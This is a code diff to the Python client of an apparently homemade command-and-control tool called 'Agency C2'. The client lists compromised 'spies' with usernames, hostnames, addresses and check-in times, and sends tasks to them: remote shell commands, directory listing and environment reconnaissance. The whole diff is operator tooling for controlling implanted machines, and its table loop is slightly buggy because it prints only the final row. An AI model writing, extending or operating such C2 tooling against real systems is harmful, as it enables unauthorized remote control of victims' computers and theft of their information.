@@ -1,6 +1,7 @@
 import asyncio
 import aiohttp
 import argparse
+import json
 
 # Global variable for the current prompt
 current_prompt = ""
@@ -24,7 +25,7 @@ async def poll_for_output(session, server, agent, stop_polling):
             await asyncio.sleep(1)
 
 async def send_command(session, server, agent, command):
-    await session.get(f'{server}/mission/{agent}/{command}')
+    await session.post(f'{server}/mission/{agent}', json={"command": command})
 
 async def async_input(prompt):
     return await asyncio.to_thread(input, prompt)
@@ -48,7 +49,29 @@ async def main(ip, port, name):
             if command.startswith("list"):
                 async with session.get(f'{server}/spies') as response:
                     text = await response.text()
-                    print(text.replace("<p>", "").replace("</p>", "").replace("<br>", "\n"))
+                    data = json.loads(text)
+                    headers = ["ID", "GUID", "Active", "Internal Address", "External Address", "Username", "Hostname", "OS", "PID", "First Check-In", "Last Check-In"]
+                    header_line = "| " + " | ".join(headers) + " |"
+                    print(header_line)
+                    print("|" + "-"*len(header_line) + "|")
+
+# Print each entry in the JSON as a row in the table
+                    for entry in data:
+                        row = [
+                            str(entry.get("id", "")),
+                            entry.get("guid", ""),
+                            str(entry.get("active", "")),
+                            entry.get("intaddr", ""),
+                            entry.get("extaddr", ""),
+                            entry.get("username", ""),
+                            entry.get("hostname", ""),
+                            entry.get("ops", ""),
+                            str(entry.get("pid", "")),
+                            entry.get("firstcheckin", ""),
+                            entry.get("lastcheckin", ""),
+                            ]
+                    print("| " + " | ".join(row) + " |")
+
                 continue
 
             if command.startswith("spy"):
@@ -57,9 +80,9 @@ async def main(ip, port, name):
                 agent = command.split()[1]
                 continue
 
-            if command.startswith("shell") and agent != 0:
-                shell_command = ' '.join(command.split()[1:])
-                await send_command(session, server, agent, shell_command)
+            if command.startswith("task") and agent != 0:
+                task_command = ' '.join(command.split()[1:])
+                await send_command(session, server, agent, task_command)
                 continue
 
             if command == "help":
@@ -67,7 +90,11 @@ async def main(ip, port, name):
                 print("===Command===")
                 print("list: List all active spies")
                 print("spy <id>: Select spy No.id")
-                print("shell <command>: Execute command and display the output")
+                print("task shell <command>: Execute system command and display the output")
+                print("task cd <Dir>: Change current location to a specified one")
+                print("task ls <Dir>: List directories and files of a given location")
+                print("task whereami: Retrieve current user, operating system, and environment information")
+              #  print("shell <command>: Execute command and display the output")
                 print("help: Display this menu")
                 print("exit: Exit Agency C2 Client\n\n")
 
